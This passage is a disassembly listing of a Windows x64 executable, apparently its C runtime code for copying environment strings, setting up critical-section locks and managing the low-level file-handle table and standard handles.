   140007904:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007909:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000790e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007913:	57                   	push   %rdi
   140007914:	48 83 ec 20          	sub    $0x20,%rsp
   140007918:	ff 15 8a 68 00 00    	call   *0x688a(%rip)        # 0x14000e1a8
   14000791e:	33 ed                	xor    %ebp,%ebp
   140007920:	48 8b d8             	mov    %rax,%rbx
   140007923:	48 85 c0             	test   %rax,%rax
   140007926:	74 63                	je     0x14000798b
   140007928:	48 8b f3             	mov    %rbx,%rsi
   14000792b:	66 39 28             	cmp    %bp,(%rax)
   14000792e:	74 1a                	je     0x14000794a
   140007930:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140007934:	48 ff c0             	inc    %rax
   140007937:	66 39 2c 46          	cmp    %bp,(%rsi,%rax,2)
   14000793b:	75 f7                	jne    0x140007934
   14000793d:	48 8d 34 46          	lea    (%rsi,%rax,2),%rsi
   140007941:	48 83 c6 02          	add    $0x2,%rsi
   140007945:	66 39 2e             	cmp    %bp,(%rsi)
   140007948:	75 e6                	jne    0x140007930
   14000794a:	48 2b f3             	sub    %rbx,%rsi
   14000794d:	48 83 c6 02          	add    $0x2,%rsi
   140007951:	48 d1 fe             	sar    $1,%rsi
   140007954:	48 03 f6             	add    %rsi,%rsi
   140007957:	48 8b ce             	mov    %rsi,%rcx
   14000795a:	e8 9d 09 00 00       	call   0x1400082fc
   14000795f:	48 8b f8             	mov    %rax,%rdi
   140007962:	48 85 c0             	test   %rax,%rax
   140007965:	74 11                	je     0x140007978
   140007967:	4c 8b c6             	mov    %rsi,%r8
   14000796a:	48 8b d3             	mov    %rbx,%rdx
   14000796d:	48 8b c8             	mov    %rax,%rcx
   140007970:	e8 7b 59 00 00       	call   0x14000d2f0
   140007975:	48 8b ef             	mov    %rdi,%rbp
   140007978:	33 c9                	xor    %ecx,%ecx
   14000797a:	e8 ad ec ff ff       	call   0x14000662c
   14000797f:	48 8b cb             	mov    %rbx,%rcx
   140007982:	ff 15 28 68 00 00    	call   *0x6828(%rip)        # 0x14000e1b0
   140007988:	48 8b c5             	mov    %rbp,%rax
   14000798b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007990:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007995:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000799a:	48 83 c4 20          	add    $0x20,%rsp
   14000799e:	5f                   	pop    %rdi
   14000799f:	c3                   	ret
   1400079a0:	40 53                	rex push %rbx
   1400079a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400079a6:	33 db                	xor    %ebx,%ebx
   1400079a8:	48 8d 15 01 16 01 00 	lea    0x11601(%rip),%rdx        # 0x140018fb0
   1400079af:	45 33 c0             	xor    %r8d,%r8d
   1400079b2:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400079b6:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   1400079ba:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400079bf:	e8 ac 11 00 00       	call   0x140008b70
   1400079c4:	85 c0                	test   %eax,%eax
   1400079c6:	74 11                	je     0x1400079d9
   1400079c8:	ff 05 12 18 01 00    	incl   0x11812(%rip)        # 0x1400191e0
   1400079ce:	ff c3                	inc    %ebx
   1400079d0:	83 fb 0e             	cmp    $0xe,%ebx
   1400079d3:	72 d3                	jb     0x1400079a8
   1400079d5:	b0 01                	mov    $0x1,%al
   1400079d7:	eb 09                	jmp    0x1400079e2
   1400079d9:	33 c9                	xor    %ecx,%ecx
   1400079db:	e8 24 00 00 00       	call   0x140007a04
   1400079e0:	32 c0                	xor    %al,%al
   1400079e2:	48 83 c4 20          	add    $0x20,%rsp
   1400079e6:	5b                   	pop    %rbx
   1400079e7:	c3                   	ret
   1400079e8:	48 63 c1             	movslq %ecx,%rax
   1400079eb:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400079ef:	48 8d 05 ba 15 01 00 	lea    0x115ba(%rip),%rax        # 0x140018fb0
   1400079f6:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400079fa:	48 ff 25 9f 66 00 00 	rex.W jmp *0x669f(%rip)        # 0x14000e0a0
   140007a01:	cc                   	int3
   140007a02:	cc                   	int3
   140007a03:	cc                   	int3
   140007a04:	40 53                	rex push %rbx
   140007a06:	48 83 ec 20          	sub    $0x20,%rsp
   140007a0a:	8b 1d d0 17 01 00    	mov    0x117d0(%rip),%ebx        # 0x1400191e0
   140007a10:	eb 1d                	jmp    0x140007a2f
   140007a12:	48 8d 05 97 15 01 00 	lea    0x11597(%rip),%rax        # 0x140018fb0
   140007a19:	ff cb                	dec    %ebx
   140007a1b:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140007a1f:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007a23:	ff 15 87 66 00 00    	call   *0x6687(%rip)        # 0x14000e0b0
   140007a29:	ff 0d b1 17 01 00    	decl   0x117b1(%rip)        # 0x1400191e0
   140007a2f:	85 db                	test   %ebx,%ebx
   140007a31:	75 df                	jne    0x140007a12
   140007a33:	b0 01                	mov    $0x1,%al
   140007a35:	48 83 c4 20          	add    $0x20,%rsp
   140007a39:	5b                   	pop    %rbx
   140007a3a:	c3                   	ret
   140007a3b:	cc                   	int3
   140007a3c:	48 63 c1             	movslq %ecx,%rax
   140007a3f:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140007a43:	48 8d 05 66 15 01 00 	lea    0x11566(%rip),%rax        # 0x140018fb0
   140007a4a:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007a4e:	48 ff 25 53 66 00 00 	rex.W jmp *0x6653(%rip)        # 0x14000e0a8
   140007a55:	cc                   	int3
   140007a56:	cc                   	int3
   140007a57:	cc                   	int3
   140007a58:	40 53                	rex push %rbx
   140007a5a:	48 83 ec 20          	sub    $0x20,%rsp
   140007a5e:	33 db                	xor    %ebx,%ebx
   140007a60:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140007a64:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140007a6b:	00 00 
   140007a6d:	48 8b 48 20          	mov    0x20(%rax),%rcx
   140007a71:	39 59 08             	cmp    %ebx,0x8(%rcx)
   140007a74:	7c 11                	jl     0x140007a87
   140007a76:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007a7b:	e8 78 10 00 00       	call   0x140008af8
   140007a80:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   140007a85:	74 05                	je     0x140007a8c
   140007a87:	bb 01 00 00 00       	mov    $0x1,%ebx
   140007a8c:	8b c3                	mov    %ebx,%eax
   140007a8e:	48 83 c4 20          	add    $0x20,%rsp
   140007a92:	5b                   	pop    %rbx
   140007a93:	c3                   	ret
   140007a94:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007a99:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007a9e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007aa3:	57                   	push   %rdi
   140007aa4:	48 83 ec 20          	sub    $0x20,%rsp
   140007aa8:	ba 48 00 00 00       	mov    $0x48,%edx
   140007aad:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   140007ab0:	e8 ff ea ff ff       	call   0x1400065b4
   140007ab5:	33 f6                	xor    %esi,%esi
   140007ab7:	48 8b d8             	mov    %rax,%rbx
   140007aba:	48 85 c0             	test   %rax,%rax
   140007abd:	74 5b                	je     0x140007b1a
   140007abf:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   140007ac6:	48 3b c5             	cmp    %rbp,%rax
   140007ac9:	74 4c                	je     0x140007b17
   140007acb:	48 8d 78 30          	lea    0x30(%rax),%rdi
   140007acf:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   140007ad3:	45 33 c0             	xor    %r8d,%r8d
   140007ad6:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140007adb:	e8 90 10 00 00       	call   0x140008b70
   140007ae0:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   140007ae5:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   140007ae9:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   140007aed:	8b c6                	mov    %esi,%eax
   140007aef:	48 89 37             	mov    %rsi,(%rdi)
   140007af2:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   140007af9:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   140007afd:	40 88 31             	mov    %sil,(%rcx)
   140007b00:	ff c0                	inc    %eax
   140007b02:	48 ff c1             	inc    %rcx
   140007b05:	83 f8 05             	cmp    $0x5,%eax
   140007b08:	72 f3                	jb     0x140007afd
   140007b0a:	48 83 c7 48          	add    $0x48,%rdi
   140007b0e:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   140007b12:	48 3b c5             	cmp    %rbp,%rax
   140007b15:	75 b8                	jne    0x140007acf
   140007b17:	48 8b f3             	mov    %rbx,%rsi
   140007b1a:	33 c9                	xor    %ecx,%ecx
   140007b1c:	e8 0b eb ff ff       	call   0x14000662c
   140007b21:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007b26:	48 8b c6             	mov    %rsi,%rax
   140007b29:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007b2e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007b33:	48 83 c4 20          	add    $0x20,%rsp
   140007b37:	5f                   	pop    %rdi
   140007b38:	c3                   	ret
   140007b39:	cc                   	int3
   140007b3a:	cc                   	int3
   140007b3b:	cc                   	int3
   140007b3c:	48 85 c9             	test   %rcx,%rcx
   140007b3f:	74 4a                	je     0x140007b8b
   140007b41:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007b46:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007b4b:	57                   	push   %rdi
   140007b4c:	48 83 ec 20          	sub    $0x20,%rsp
   140007b50:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   140007b57:	48 8b d9             	mov    %rcx,%rbx
   140007b5a:	48 8b f9             	mov    %rcx,%rdi
   140007b5d:	48 3b ce             	cmp    %rsi,%rcx
   140007b60:	74 12                	je     0x140007b74
   140007b62:	48 8b cf             	mov    %rdi,%rcx
   140007b65:	ff 15 45 65 00 00    	call   *0x6545(%rip)        # 0x14000e0b0
   140007b6b:	48 83 c7 48          	add    $0x48,%rdi
   140007b6f:	48 3b fe             	cmp    %rsi,%rdi
   140007b72:	75 ee                	jne    0x140007b62
   140007b74:	48 8b cb             	mov    %rbx,%rcx
   140007b77:	e8 b0 ea ff ff       	call   0x14000662c
   140007b7c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007b81:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007b86:	48 83 c4 20          	add    $0x20,%rsp
   140007b8a:	5f                   	pop    %rdi
   140007b8b:	c3                   	ret
   140007b8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007b91:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007b96:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007b9b:	41 57                	push   %r15
   140007b9d:	48 83 ec 30          	sub    $0x30,%rsp
   140007ba1:	8b f1                	mov    %ecx,%esi
   140007ba3:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   140007ba9:	72 29                	jb     0x140007bd4
   140007bab:	e8 e4 e9 ff ff       	call   0x140006594
   140007bb0:	bb 09 00 00 00       	mov    $0x9,%ebx
   140007bb5:	89 18                	mov    %ebx,(%rax)
   140007bb7:	e8 80 e7 ff ff       	call   0x14000633c
   140007bbc:	8b c3                	mov    %ebx,%eax
   140007bbe:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007bc3:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140007bc8:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140007bcd:	48 83 c4 30          	add    $0x30,%rsp
   140007bd1:	41 5f                	pop    %r15
   140007bd3:	c3                   	ret
   140007bd4:	33 ff                	xor    %edi,%edi
   140007bd6:	8d 4f 07             	lea    0x7(%rdi),%ecx
   140007bd9:	e8 0a fe ff ff       	call   0x1400079e8
   140007bde:	90                   	nop
   140007bdf:	8b df                	mov    %edi,%ebx
   140007be1:	8b 05 09 1a 01 00    	mov    0x11a09(%rip),%eax        # 0x1400195f0
   140007be7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007bec:	3b f0                	cmp    %eax,%esi
   140007bee:	7c 36                	jl     0x140007c26
   140007bf0:	4c 8d 3d f9 15 01 00 	lea    0x115f9(%rip),%r15        # 0x1400191f0
   140007bf7:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   140007bfb:	74 02                	je     0x140007bff
   140007bfd:	eb 22                	jmp    0x140007c21
   140007bff:	e8 90 fe ff ff       	call   0x140007a94
   140007c04:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   140007c08:	48 85 c0             	test   %rax,%rax
   140007c0b:	75 05                	jne    0x140007c12
   140007c0d:	8d 78 0c             	lea    0xc(%rax),%edi
   140007c10:	eb 14                	jmp    0x140007c26
   140007c12:	8b 05 d8 19 01 00    	mov    0x119d8(%rip),%eax        # 0x1400195f0
   140007c18:	83 c0 40             	add    $0x40,%eax
   140007c1b:	89 05 cf 19 01 00    	mov    %eax,0x119cf(%rip)        # 0x1400195f0
   140007c21:	48 ff c3             	inc    %rbx
   140007c24:	eb c1                	jmp    0x140007be7
   140007c26:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007c2b:	e8 0c fe ff ff       	call   0x140007a3c
   140007c30:	8b c7                	mov    %edi,%eax
   140007c32:	eb 8a                	jmp    0x140007bbe
   140007c34:	48 63 d1             	movslq %ecx,%rdx
   140007c37:	4c 8d 05 b2 15 01 00 	lea    0x115b2(%rip),%r8        # 0x1400191f0
   140007c3e:	48 8b c2             	mov    %rdx,%rax
   140007c41:	83 e2 3f             	and    $0x3f,%edx
   140007c44:	48 c1 f8 06          	sar    $0x6,%rax
   140007c48:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140007c4c:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140007c50:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007c54:	48 ff 25 45 64 00 00 	rex.W jmp *0x6445(%rip)        # 0x14000e0a0
   140007c5b:	cc                   	int3
   140007c5c:	48 63 d1             	movslq %ecx,%rdx
   140007c5f:	4c 8d 05 8a 15 01 00 	lea    0x1158a(%rip),%r8        # 0x1400191f0
   140007c66:	48 8b c2             	mov    %rdx,%rax
   140007c69:	83 e2 3f             	and    $0x3f,%edx
   140007c6c:	48 c1 f8 06          	sar    $0x6,%rax
   140007c70:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140007c74:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140007c78:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007c7c:	48 ff 25 25 64 00 00 	rex.W jmp *0x6425(%rip)        # 0x14000e0a8
   140007c83:	cc                   	int3
   140007c84:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007c89:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007c8e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007c93:	41 56                	push   %r14
   140007c95:	48 83 ec 20          	sub    $0x20,%rsp
   140007c99:	48 63 d9             	movslq %ecx,%rbx
   140007c9c:	85 c9                	test   %ecx,%ecx
   140007c9e:	78 72                	js     0x140007d12
   140007ca0:	3b 1d 4a 19 01 00    	cmp    0x1194a(%rip),%ebx        # 0x1400195f0
   140007ca6:	73 6a                	jae    0x140007d12
   140007ca8:	48 8b c3             	mov    %rbx,%rax
   140007cab:	4c 8d 35 3e 15 01 00 	lea    0x1153e(%rip),%r14        # 0x1400191f0
   140007cb2:	83 e0 3f             	and    $0x3f,%eax
   140007cb5:	48 8b f3             	mov    %rbx,%rsi
   140007cb8:	48 c1 ee 06          	shr    $0x6,%rsi
   140007cbc:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   140007cc0:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140007cc4:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   140007cc9:	74 47                	je     0x140007d12
   140007ccb:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140007cd1:	74 3f                	je     0x140007d12
   140007cd3:	e8 bc c7 ff ff       	call   0x140004494
   140007cd8:	83 f8 01             	cmp    $0x1,%eax
   140007cdb:	75 27                	jne    0x140007d04
   140007cdd:	85 db                	test   %ebx,%ebx
   140007cdf:	74 16                	je     0x140007cf7
   140007ce1:	2b d8                	sub    %eax,%ebx
   140007ce3:	74 0b                	je     0x140007cf0
   140007ce5:	3b d8                	cmp    %eax,%ebx
   140007ce7:	75 1b                	jne    0x140007d04
   140007ce9:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140007cee:	eb 0c                	jmp    0x140007cfc
   140007cf0:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140007cf5:	eb 05                	jmp    0x140007cfc
   140007cf7:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140007cfc:	33 d2                	xor    %edx,%edx
   140007cfe:	ff 15 b4 64 00 00    	call   *0x64b4(%rip)        # 0x14000e1b8
   140007d04:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140007d08:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140007d0e:	33 c0                	xor    %eax,%eax
   140007d10:	eb 16                	jmp    0x140007d28
   140007d12:	e8 7d e8 ff ff       	call   0x140006594
   140007d17:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007d1d:	e8 52 e8 ff ff       	call   0x140006574
   140007d22:	83 20 00             	andl   $0x0,(%rax)
   140007d25:	83 c8 ff             	or     $0xffffffff,%eax
   140007d28:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007d2d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007d32:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140007d37:	48 83 c4 20          	add    $0x20,%rsp
   140007d3b:	41 5e                	pop    %r14
   140007d3d:	c3                   	ret
   140007d3e:	cc                   	int3
   140007d3f:	cc                   	int3
   140007d40:	48 83 ec 28          	sub    $0x28,%rsp
   140007d44:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140007d47:	75 15                	jne    0x140007d5e
   140007d49:	e8 26 e8 ff ff       	call   0x140006574
   140007d4e:	83 20 00             	andl   $0x0,(%rax)
   140007d51:	e8 3e e8 ff ff       	call   0x140006594
   140007d56:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007d5c:	eb 4e                	jmp    0x140007dac
   140007d5e:	85 c9                	test   %ecx,%ecx
   140007d60:	78 32                	js     0x140007d94
   140007d62:	3b 0d 88 18 01 00    	cmp    0x11888(%rip),%ecx        # 0x1400195f0
   140007d68:	73 2a                	jae    0x140007d94
   140007d6a:	48 63 c9             	movslq %ecx,%rcx
   140007d6d:	4c 8d 05 7c 14 01 00 	lea    0x1147c(%rip),%r8        # 0x1400191f0
   140007d74:	48 8b c1             	mov    %rcx,%rax
   140007d77:	83 e1 3f             	and    $0x3f,%ecx
   140007d7a:	48 c1 e8 06          	shr    $0x6,%rax
   140007d7e:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   140007d82:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140007d86:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   140007d8b:	74 07                	je     0x140007d94
   140007d8d:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   140007d92:	eb 1c                	jmp    0x140007db0
   140007d94:	e8 db e7 ff ff       	call   0x140006574
   140007d99:	83 20 00             	andl   $0x0,(%rax)
   140007d9c:	e8 f3 e7 ff ff       	call   0x140006594
   140007da1:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007da7:	e8 90 e5 ff ff       	call   0x14000633c
   140007dac:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140007db0:	48 83 c4 28          	add    $0x28,%rsp
   140007db4:	c3                   	ret
   140007db5:	cc                   	int3
   140007db6:	cc                   	int3
   140007db7:	cc                   	int3
   140007db8:	8b 05 26 14 01 00    	mov    0x11426(%rip),%eax        # 0x1400191e4
   140007dbe:	b9 00 40 00 00       	mov    $0x4000,%ecx
   140007dc3:	85 c0                	test   %eax,%eax
   140007dc5:	0f 44 c1             	cmove  %ecx,%eax
   140007dc8:	89 05 16 14 01 00    	mov    %eax,0x11416(%rip)        # 0x1400191e4
   140007dce:	33 c0                	xor    %eax,%eax
   140007dd0:	c3                   	ret
   140007dd1:	cc                   	int3
   140007dd2:	cc                   	int3
   140007dd3:	cc                   	int3
   140007dd4:	48 8b c4             	mov    %rsp,%rax
   140007dd7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007ddb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007ddf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007de3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007de7:	41 56                	push   %r14
   140007de9:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140007df0:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   140007df4:	ff 15 6e 62 00 00    	call   *0x626e(%rip)        # 0x14000e068
   140007dfa:	45 33 f6             	xor    %r14d,%r14d
   140007dfd:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   140007e03:	0f 84 9a 00 00 00    	je     0x140007ea3
   140007e09:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140007e0e:	48 85 c0             	test   %rax,%rax
   140007e11:	0f 84 8c 00 00 00    	je     0x140007ea3
   140007e17:	48 63 18             	movslq (%rax),%rbx
   140007e1a:	48 8d 70 04          	lea    0x4(%rax),%rsi
   140007e1e:	bf 00 20 00 00       	mov    $0x2000,%edi
   140007e23:	48 03 de             	add    %rsi,%rbx
   140007e26:	39 38                	cmp    %edi,(%rax)
   140007e28:	0f 4c 38             	cmovl  (%rax),%edi
   140007e2b:	8b cf                	mov    %edi,%ecx
   140007e2d:	e8 5a fd ff ff       	call   0x140007b8c
   140007e32:	3b 3d b8 17 01 00    	cmp    0x117b8(%rip),%edi        # 0x1400195f0
   140007e38:	0f 4f 3d b1 17 01 00 	cmovg  0x117b1(%rip),%edi        # 0x1400195f0
   140007e3f:	85 ff                	test   %edi,%edi
   140007e41:	74 60                	je     0x140007ea3
   140007e43:	41 8b ee             	mov    %r14d,%ebp
   140007e46:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140007e4a:	74 47                	je     0x140007e93
   140007e4c:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   140007e50:	74 41                	je     0x140007e93
   140007e52:	f6 06 01             	testb  $0x1,(%rsi)
   140007e55:	74 3c                	je     0x140007e93
   140007e57:	f6 06 08             	testb  $0x8,(%rsi)
   140007e5a:	75 0d                	jne    0x140007e69
   140007e5c:	48 8b 0b             	mov    (%rbx),%rcx
   140007e5f:	ff 15 5b 63 00 00    	call   *0x635b(%rip)        # 0x14000e1c0
   140007e65:	85 c0                	test   %eax,%eax
   140007e67:	74 2a                	je     0x140007e93
   140007e69:	48 8b c5             	mov    %rbp,%rax
   140007e6c:	4c 8d 05 7d 13 01 00 	lea    0x1137d(%rip),%r8        # 0x1400191f0
   140007e73:	48 8b cd             	mov    %rbp,%rcx
   140007e76:	48 c1 f9 06          	sar    $0x6,%rcx
   140007e7a:	83 e0 3f             	and    $0x3f,%eax
   140007e7d:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   140007e81:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   140007e85:	48 8b 03             	mov    (%rbx),%rax
   140007e88:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   140007e8d:	8a 06                	mov    (%rsi),%al
   140007e8f:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   140007e93:	48 ff c5             	inc    %rbp
   140007e96:	48 ff c6             	inc    %rsi
   140007e99:	48 83 c3 08          	add    $0x8,%rbx
   140007e9d:	48 83 ef 01          	sub    $0x1,%rdi
   140007ea1:	75 a3                	jne    0x140007e46
   140007ea3:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140007eaa:	00 
   140007eab:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140007eaf:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140007eb3:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140007eb7:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140007ebb:	49 8b e3             	mov    %r11,%rsp
   140007ebe:	41 5e                	pop    %r14
   140007ec0:	c3                   	ret
   140007ec1:	cc                   	int3
   140007ec2:	cc                   	int3
   140007ec3:	cc                   	int3
   140007ec4:	48 8b c4             	mov    %rsp,%rax
   140007ec7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007ecb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007ecf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007ed3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007ed7:	41 56                	push   %r14
   140007ed9:	48 83 ec 20          	sub    $0x20,%rsp
   140007edd:	33 f6                	xor    %esi,%esi
   140007edf:	45 33 f6             	xor    %r14d,%r14d
   140007ee2:	48 63 ce             	movslq %esi,%rcx
   140007ee5:	48 8d 3d 04 13 01 00 	lea    0x11304(%rip),%rdi        # 0x1400191f0
   140007eec:	48 8b c1             	mov    %rcx,%rax
   140007eef:	83 e1 3f             	and    $0x3f,%ecx
   140007ef2:	48 c1 f8 06          	sar    $0x6,%rax
   140007ef6:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   140007efa:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   140007efe:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   140007f03:	48 83 c0 02          	add    $0x2,%rax
   140007f07:	48 83 f8 01          	cmp    $0x1,%rax
   140007f0b:	76 0a                	jbe    0x140007f17
   140007f0d:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   140007f12:	e9 8b 00 00 00       	jmp    0x140007fa2
   140007f17:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   140007f1c:	8b ce                	mov    %esi,%ecx
   140007f1e:	85 f6                	test   %esi,%esi
   140007f20:	74 16                	je     0x140007f38
   140007f22:	83 e9 01             	sub    $0x1,%ecx
   140007f25:	74 0a                	je     0x140007f31
   140007f27:	83 f9 01             	cmp    $0x1,%ecx
   140007f2a:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140007f2f:	eb 0c                	jmp    0x140007f3d
   140007f31:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140007f36:	eb 05                	jmp    0x140007f3d
   140007f38:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140007f3d:	ff 15 cd 61 00 00    	call   *0x61cd(%rip)        # 0x14000e110
   140007f43:	48 8b e8             	mov    %rax,%rbp
   140007f46:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140007f4a:	48 83 f9 01          	cmp    $0x1,%rcx
   140007f4e:	76 2d                	jbe    0x140007f7d
   140007f50:	48 8b c8             	mov    %rax,%rcx
   140007f53:	ff 15 67 62 00 00    	call   *0x6267(%rip)        # 0x14000e1c0
   140007f59:	85 c0                	test   %eax,%eax
   140007f5b:	74 20                	je     0x140007f7d
   140007f5d:	0f b6 c0             	movzbl %al,%eax
   140007f60:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   140007f65:	83 f8 02             	cmp    $0x2,%eax
   140007f68:	75 07                	jne    0x140007f71
   140007f6a:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140007f6f:	eb 31                	jmp    0x140007fa2
   140007f71:	83 f8 03             	cmp    $0x3,%eax
   140007f74:	75 2c                	jne    0x140007fa2
   140007f76:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   140007f7b:	eb 25                	jmp    0x140007fa2
   140007f7d:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140007f82:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   140007f89:	ff ff 
   140007f8b:	48 8b 05 3e 18 01 00 	mov    0x1183e(%rip),%rax        # 0x1400197d0
   140007f92:	48 85 c0             	test   %rax,%rax
   140007f95:	74 0b                	je     0x140007fa2
   140007f97:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   140007f9b:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   140007fa2:	ff c6                	inc    %esi
   140007fa4:	49 83 c6 08          	add    $0x8,%r14
   140007fa8:	83 fe 03             	cmp    $0x3,%esi
   140007fab:	0f 85 31 ff ff ff    	jne    0x140007ee2
   140007fb1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007fb6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007fbb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
